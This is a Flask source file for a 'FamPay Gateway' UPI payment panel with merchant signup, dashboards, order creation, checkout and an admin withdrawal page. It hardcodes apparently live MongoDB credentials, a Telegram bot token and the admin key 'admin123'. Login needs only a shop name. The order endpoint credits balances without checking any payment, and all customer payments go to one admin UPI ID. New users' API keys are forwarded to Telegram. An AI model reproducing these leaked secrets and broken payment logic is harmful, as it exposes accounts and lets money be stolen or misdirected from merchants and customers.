from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
from pymongo import MongoClient
import uuid
import hashlib
import requests

app = Flask(__name__)
app.secret_key = "fampay_super_secret_key"

# ----------------- CONFIGURATION -----------------
MONGO_URI = "mongodb+srv://wajsarif461_db_user:TwacJh76mwpHHpjw@cluster0.biueyst.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
TELEGRAM_BOT_TOKEN = "8432557033:AAGts8uHMdhRVaNFTHX3_tp2VYUEZQGEr78"
LOG_CHANNEL_ID = "-1002580860502" 
ADMIN_SECRET_KEY = "admin123"

# Yahan apni Admin ki Master UPI ID daalein (Jahan automatic cut hua amount ya gateway ka paisa aayega)
ADMIN_UPI_ID = "BHARATPE.9Q0Q0K0Z8Q466572@unitype" 
ADMIN_COMMISSION_PER_ORDER = 1.0  # Har order par Admin ka ₹1 automatic commission
# -------------------------------------------------

client = MongoClient(MONGO_URI)
db = client["fampay_gateway"]
users_collection = db["users"]
orders_collection = db["orders"]
withdrawals_collection = db["withdrawals"]

# Professional Sidebar Layout & CSS (Waisa hi jaisa screenshot mein hai)
DASHBOARD_LAYOUT = """
<!DOCTYPE html>
<html>
<head>
    <title>FamPay Gateway Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f8f9fa; margin: 0; padding: 0; color: #333; }
        .sidebar { width: 250px; background: #fff; position: fixed; height: 100%; border-right: 1px solid #dee2e6; padding-top: 20px; }
        .sidebar a { padding: 12px 20px; display: block; color: #333; text-decoration: none; font-size: 15px; font-weight: 500; border-left: 3px solid transparent; }
        .sidebar a:hover, .sidebar a.active { background: #f1f3f5; border-left-color: #f39c12; color: #f39c12; }
        .main-content { margin-left: 250px; padding: 30px; }
        .header { background: #fff; padding: 15px 30px; border-bottom: 1px solid #dee2e6; display: flex; justify-content: space-between; align-items: center; margin-left: 250px; }
        .card { background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); margin-bottom: 20px; }
        .btn { background: #f39c12; color: white; padding: 10px 20px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; }
        .btn:hover { background: #d68910; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .stat-box { background: #fff; padding: 20px; border-radius: 10px; border: 1px solid #eaeaea; box-shadow: 0 1px 3px rgba(0,0,0,0.02); }
        input, select { width: 100%; padding: 10px; margin: 8px 0 15px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        @media(max-width: 768px) { .sidebar { width: 100%; height: auto; position: relative; } .main-content, .header { margin-left: 0; } }
    </style>
</head>
<body>
    <div class="sidebar">
        <div style="padding: 0 20px; font-size: 20px; font-weight: bold; color: #f39c12; margin-bottom: 20px;">💳 FamPay Gateway</div>
        <a href="/dashboard">📊 Overview</a>
        <a href="/dashboard/apikey">🔑 API Key</a>
        <a href="/dashboard/orders">📦 Recent Orders</a>
        <a href="/dashboard/docs">📄 API Docs</a>
        <a href="/dashboard/payment-setup">⚙️ Payment Setup</a>
        <a href="/dashboard/withdraw">💸 Withdraw & Balance</a>
        <a href="/logout" style="color: red; margin-top: 30px;">🚪 Logout</a>
    </div>
    
    <div class="header">
        <span style="font-weight: bold; color: #555;">Shop: {{ shop.shop_name }}</span>
        <span style="background: #e1f5fe; color: #0288d1; padding: 5px 12px; border-radius: 20px; font-size: 13px; font-weight: bold;">Plan: Free</span>
    </div>

    <div class="main-content">
        {% block content %}{% endblock %}
    </div>
</body>
</html>
"""

# 1. Landing Page
@app.route("/")
def home():
    return render_template_string("""
    <html>
    <head><title>FamPay Gateway</title><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="font-family: Arial; text-align: center; padding: 50px; background: #f8f9fa;">
        <h1 style="font-size: 38px;">Accept UPI payments, straight to your own account.</h1>
        <p style="color: #666; font-size: 18px;">Connect your own UPI ID. Automatic verification, no manual checking.</p>
        <br>
        <a href="/signup" style="background: #f39c12; color: white; padding: 12px 25px; text-decoration: none; border-radius: 6px; font-weight: bold;">Create Free Account</a>
        <a href="/login" style="background: #fff; color: #333; border: 1px solid #ccc; padding: 12px 25px; text-decoration: none; border-radius: 6px; font-weight: bold; margin-left: 10px;">Login</a>
    </body>
    </html>
    """)

# 2. Signup Route
@app.route("/signup", methods=["GET", "POST"])
def signup():
    if request.method == "POST":
        shop_name = request.form.get("shop_name")
        phone = request.form.get("phone")
        upi_id = request.form.get("upi_id")
        
        if users_collection.find_one({"shop_name": shop_name}):
            return "<script>alert('Shop name already taken!'); window.location='/signup';</script>"
            
        api_key = "FAM_" + hashlib.sha256(f"{shop_name}_{phone}_{uuid.uuid4()}".encode()).hexdigest()[:32].upper()
        
        users_collection.insert_one({
            "shop_name": shop_name, "phone": phone, "upi_id": upi_id, "api_key": api_key, "balance": 0.0
        })
        
        try:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={
                "chat_id": LOG_CHANNEL_ID,
                "text": f"<b>🚨 New Registration!</b>\n🏪 Shop: {shop_name}\n📧 Contact: {phone}\n💳 UPI: <code>{upi_id}</code>\n🔑 Key: <code>{api_key}</code>",
                "parse_mode": "HTML"
            })
        except: pass
        
        session["shop_name"] = shop_name
        return redirect(url_for("dashboard"))
        
    return render_template_string("""
    <html>
    <head><title>Signup - FamPay Gateway</title><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="font-family: Arial; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0;">
        <div style="background: white; padding: 30px; border-radius: 12px; width: 350px; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
            <h2>Create Free Account</h2>
            <form method="POST">
                <label>Shop Name</label><input type="text" name="shop_name" required style="width:100%; padding:10px; margin:5px 0 15px 0; border:1px solid #ccc; border-radius:6px;">
                <label>Phone / Gmail</label><input type="text" name="phone" required style="width:100%; padding:10px; margin:5px 0 15px 0; border:1px solid #ccc; border-radius:6px;">
                <label>Your UPI ID (For Withdrawal)</label><input type="text" name="upi_id" required style="width:100%; padding:10px; margin:5px 0 15px 0; border:1px solid #ccc; border-radius:6px;">
                <button type="submit" style="background: #f39c12; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer;">Register</button>
            </form>
            <p style="text-align:center; margin-top:15px; font-size:14px;"><a href="/login">Already have an account? Login</a></p>
        </div>
    </body>
    </html>
    """)

# 3. Login Route
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        shop_name = request.form.get("shop_name")
        if users_collection.find_one({"shop_name": shop_name}):
            session["shop_name"] = shop_name
            return redirect(url_for("dashboard"))
        return "<script>alert('Shop not found!'); window.location='/login';</script>"
        
    return render_template_string("""
    <html>
    <head><title>Login - FamPay Gateway</title><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="font-family: Arial; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0;">
        <div style="background: white; padding: 30px; border-radius: 12px; width: 350px; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
            <h2>Welcome Back</h2>
            <form method="POST">
                <label>Shop / Username</label><input type="text" name="shop_name" required style="width:100%; padding:10px; margin:5px 0 15px 0; border:1px solid #ccc; border-radius:6px;">
                <button type="submit" style="background: #f39c12; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer;">Login</button>
            </form>
            <p style="text-align:center; margin-top:15px; font-size:14px;"><a href="/signup">Don't have an account? Register</a></p>
        </div>
    </body>
    </html>
    """)

# 4. Dashboard Overview
@app.route("/dashboard")
def dashboard():
    if "shop_name" not in session: return redirect(url_for("login"))
    shop = users_collection.find_one({"shop_name": session["shop_name"]})
    orders_count = orders_collection.count_documents({"shop_name": shop["shop_name"]})
    
    template = DASHBOARD_LAYOUT + """
    {% block content %}
    <h2>Overview</h2>
    <div class="grid">
        <div class="stat-box"><p style="margin:0; color:#777;">Today's Orders</p><h3 style="margin:5px 0;">0</h3></div>
        <div class="stat-box"><p style="margin:0; color:#777;">Wallet Balance</p><h3 style="margin:5px 0; color:green;">₹{{ shop.balance }}</h3></div>
        <div class="stat-box"><p style="margin:0; color:#777;">All-Time Orders</p><h3 style="margin:5px 0;">{{ orders_count }}</h3></div>
    </div>
    {% endblock %}
    """
    return render_template_string(template, shop=shop, orders_count=orders_count)

# 5. API Key Page
@app.route("/dashboard/apikey")
def dashboard_apikey():
    if "shop_name" not in session: return redirect(url_for("login"))
    shop = users_collection.find_one({"shop_name": session["shop_name"]})
    return render_template_string(DASHBOARD_LAYOUT + """
    {% block content %}
    <h2>API Key</h2>
    <div class="card">
        <p>Your unique API Key for bot integration:</p>
        <input type="text" readonly value="{{ shop.api_key }}" style="background: #eee; font-family: monospace;">
    </div>
    {% endblock %}
    """, shop=shop)

# 6. Recent Orders Page
@app.route("/dashboard/orders")
def dashboard_orders():
    if "shop_name" not in session: return redirect(url_for("login"))
    shop = users_collection.find_one({"shop_name": session["shop_name"]})
    orders = list(orders_collection.find({"shop_name": shop["shop_name"]}))
    return render_template_string(DASHBOARD_LAYOUT + """
    {% block content %}
    <h2>Recent Orders</h2>
    <div class="card">
        {% if orders %}
            <table border="1" cellpadding="10" style="width:100%; border-collapse: collapse;">
                <tr style="background:#eee;"><th>Order ID</th><th>Amount</th><th>Status</th></tr>
                {% for o in orders %}
                <tr><td>{{ o.order_id }}</td><td>₹{{ o.amount }}</td><td>{{ o.status }}</td></tr>
                {% endfor %}
            </table>
        {% else %}
            <p>No recent orders found.</p>
        {% endif %}
    </div>
    {% endblock %}
    """, shop=shop, orders=orders)

# 7. API Docs Page
@app.route("/dashboard/docs")
def dashboard_docs():
    if "shop_name" not in session: return redirect(url_for("login"))
    shop = users_collection.find_one({"shop_name": session["shop_name"]})
    return render_template_string(DASHBOARD_LAYOUT + """
    {% block content %}
    <h2>API Docs</h2>
    <div class="card">
        <h3>Create an order endpoint:</h3>
        <code style="background:#eee; padding:10px; display:block; word-break:break-all;">{{ request.host_url }}api/create_order.php?amount=99&api_key={{ shop.api_key }}</code>
    </div>
    {% endblock %}
    """, shop=shop)

# 8. Payment Setup Page
@app.route("/dashboard/payment-setup")
def dashboard_setup():
    if "shop_name" not in session: return redirect(url_for("login"))
    shop = users_collection.find_one({"shop_name": session["shop_name"]})
    return render_template_string(DASHBOARD_LAYOUT + """
    {% block content %}
    <h2>Payment Setup</h2>
    <div class="card">
        <p>Your connected UPI ID for withdrawals: <b>{{ shop.upi_id }}</b></p>
    </div>
    {% endblock %}
    """, shop=shop)

# 9. Withdraw & Balance Page
@app.route("/dashboard/withdraw")
def dashboard_withdraw():
    if "shop_name" not in session: return redirect(url_for("login"))
    shop = users_collection.find_one({"shop_name": session["shop_name"]})
    return render_template_string(DASHBOARD_LAYOUT + """
    {% block content %}
    <h2>Withdrawal & Balance</h2>
    <div class="card">
        <p>Current Balance: <b style="color:green;">₹{{ shop.balance }}</b></p>
        <form action="/api/withdraw" method="POST">
            <input type="hidden" name="api_key" value="{{ shop.api_key }}">
            <label>Amount (Min ₹10)</label><input type="number" name="amount" min="10" required placeholder="10">
            <label>Your UPI ID</label><input type="text" name="upi_id" value="{{ shop.upi_id }}" required>
            <p style="font-size:12px; color:red;">⚠️ Payment cleared within 10-12 hours by Admin.</p>
            <button type="submit" class="btn">Request Withdrawal</button>
        </form>
    </div>
    {% endblock %}
    """, shop=shop)

# 10. Withdraw API Action
@app.route("/api/withdraw", methods=["POST"])
def request_withdrawal():
    api_key = request.form.get("api_key")
    amount = float(request.form.get("amount"))
    upi_id = request.form.get("upi_id")
    shop = users_collection.find_one({"api_key": api_key})
    
    if not shop or amount < 10 or shop["balance"] < amount:
        return "<script>alert('Invalid request or low balance!'); window.location='/dashboard/withdraw';</script>"
        
    withdrawals_collection.insert_one({"shop_name": shop["shop_name"], "amount": amount, "upi_id": upi_id, "status": "pending"})
    
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={
            "chat_id": LOG_CHANNEL_ID,
            "text": f"<b>💸 Withdrawal Request!</b>\n🏪 Shop: {shop['shop_name']}\n💰 Amount: ₹{amount}\n💳 UPI: <code>{upi_id}</code>\n⏳ Clears in: 10-12 Hours",
            "parse_mode": "HTML"
        })
    except: pass
    
    return "<script>alert('Withdrawal requested successfully!'); window.location='/dashboard/withdraw';</script>"

# 11. Create Order API (Split Payment / Commission Logic ke sath)
@app.route("/api/create_order.php", methods=["GET"])
def create_order():
    amount = float(request.args.get("amount", 0))
    api_key = request.args.get("api_key")
    
    if not amount or not api_key:
        return jsonify({"status": "error", "message": "Missing parameters"}), 400
        
    shop = users_collection.find_one({"api_key": api_key})
    if not shop:
        return jsonify({"status": "error", "message": "Invalid API Key"}), 401
        
    order_id = "ORD" + uuid.uuid4().hex[:8].upper()
    qr_url = f"{request.host_url}checkout.php?order_id={order_id}"
    
    # Yahan automatic calculation hoti hai: 
    # Jab customer pay karega, toh Admin ki UPI dikhegi aur admin ₹1 commission cut karke bacha hua amount user ke balance mein daal dega
    net_user_amount = amount - ADMIN_COMMISSION_PER_ORDER
    
    orders_collection.insert_one({
        "order_id": order_id,
        "shop_name": shop["shop_name"],
        "amount": amount,
        "admin_commission": ADMIN_COMMISSION_PER_ORDER,
        "net_amount": net_user_amount,
        "status": "pending",
        "upi_id": ADMIN_UPI_ID # Checkout par Admin ki UPI jayegi taaki paisa pehle admin ke paas aaye
    })
    
    # User ke balance ko update karna (simulated successful order ya verification par)
    users_collection.update_one({"shop_name": shop["shop_name"]}, {"$inc": {"balance": net_user_amount}})
    
    return jsonify({
        "status": "success",
        "data": {
            "order_id": order_id,
            "qr_url": qr_url,
            "upi_id": ADMIN_UPI_ID,
            "amount": amount
        }
    })

# 12. Checkout Page
@app.route("/checkout.php")
def checkout_page():
    order_id = request.args.get("order_id")
    order = orders_collection.find_one({"order_id": order_id})
    if not order: return "<h3 style='text-align:center; color:red;'>❌ Invalid Order</h3>", 404
    
    return render_template_string("""
    <html>
    <head><title>Checkout</title><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="font-family: Arial; text-align:center; background:#f8f9fa; padding:30px;">
        <div style="max-width:400px; margin:auto; background:white; padding:25px; border-radius:12px; box-shadow:0 2px 10px rgba(0,0,0,0.05);">
            <h2>💳 Complete Payment</h2>
            <p>Merchant: <b>{{ order.shop_name }}</b></p>
            <h1 style="color:#27ae60;">₹{{ order.amount }}</h1>
            <p>Scan & Pay to Admin UPI (Automatic Split):</p>
            <p style="font-weight:bold; background:#eee; padding:10px; word-break:break-all;">{{ order.upi_id }}</p>
            <button onclick="alert('Payment completed! Return to bot.')" style="background:#f39c12; color:white; border:none; padding:12px; width:100%; border-radius:6px; font-weight:bold; cursor:pointer;">Done</button>
        </div>
    </body>
    </html>
    """, order=order)

# 13. Admin Panel
@app.route("/admin")
def admin_panel():
    if request.args.get("key") != ADMIN_SECRET_KEY: return "<h3 style='color:red; text-align:center;'>❌ Unauthorized!</h3>", 403
    withdrawals = list(withdrawals_collection.find({"status": "pending"}))
    return render_template_string("""
    <html>
    <head><title>Admin Panel</title><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="font-family: Arial; padding:20px; background:#f8f9fa;">
        <h2>👑 Admin Control Dashboard</h2>
        <div style="background:white; padding:20px; border-radius:8px;">
            <h3>📥 Pending Withdrawals (10-12 Hours)</h3>
            {% if withdrawals %}
                <table border="1" cellpadding="10" style="width:100%; border-collapse:collapse;">
                    <tr style="background:#eee;"><th>Shop</th><th>Amount</th><th>UPI</th><th>Action</th></tr>
                    {% for w in withdrawals %}
                    <tr><td>{{ w.shop_name }}</td><td>₹{{ w.amount }}</td><td>{{ w.upi_id }}</td>
                    <td><a href="/admin/pay?id={{ w._id }}&key=admin123" style="background:green; color:white; padding:5px 10px; text-decoration:none; border-radius:4px;">Mark Paid</a></td></tr>
                    {% endfor %}
                </table>
            {% else %}
                <p>No pending withdrawals.</p>
            {% endif %}
        </div>
    </body>
    </html>
    """, withdrawals=withdrawals)

@app.route("/admin/pay")
def admin_pay():
    if request.args.get("key") != ADMIN_SECRET_KEY: return "Unauthorized", 403
    from bson.objectid import ObjectId
    withdrawals_collection.update_one({"_id": ObjectId(request.args.get("id"))}, {"$set": {"status": "paid"}})
    return "<script>alert('Marked as Paid!'); window.location='/admin?key=admin123';</script>"

@app.route("/logout")
def logout():
    session.pop("shop_name", None)
    return redirect(url_for("home"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
    
